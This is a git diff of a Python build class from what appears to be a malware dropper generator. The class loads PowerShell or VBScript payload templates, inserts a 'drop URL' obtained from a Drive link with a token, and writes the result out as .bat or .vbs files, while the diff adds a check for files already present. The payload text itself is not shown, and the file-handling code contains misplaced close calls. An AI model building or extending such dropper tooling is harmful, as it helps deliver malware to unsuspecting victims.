@@ -16,27 +16,33 @@ class Build :
 		try:
 
 			path = "output/builds/" # Builds files
+
 			if self.filetype == "bat":
 				payloads = "data/payloads/powershell/powershell.txt" # Payload file
 			elif self.filetype == "vbs" :
 				payloads = "data/payloads/VBScript/vbs.txt" # Payload file
 
-			
-		
 			build = "{}.{}".format(self.extension, self.filetype) # Make .bat file
 
-			with open(payloads, 'r') as f :
+			if os.path.exists("output/builds/{}".format(build)):
+				print("{} File has been created{}".format(self.color.yellows("[!]"), self.extension))
 
-				# Set the drop URL or do not
-				payload = f.read()
+			if not os.path.exists("output/builds/{}".format(build)):
+				with open(payloads, 'r') as f :
 
-				if self.filetype == "bat":
-					payload = payload.replace('***', Drive(self.extension, self.token).link())
-					print("{} Execuable file in directory output/extension/{}".format(self.color.status("[+]"), self.extension))
+					# Set the drop URL or do not
+					payload = f.read()
 
-				with open(os.path.join(path, build), 'w') as builder :
-					# Write the new file
-					builder.write(payload)
+					if self.filetype == "bat":
+						
+						payload = payload.replace('******', Drive(self.extension, self.token).link())
+						print("{} Execuable file in directory output/extension/{}".format(self.color.status("[+]"), self.extension))
+
+						with open(os.path.join(path, build), 'w') as builder :
+						# Write the new file
+							builder.write(payload)
+						builder.close()
+				f.close()
 		except IOError as e:
 			raise e
 
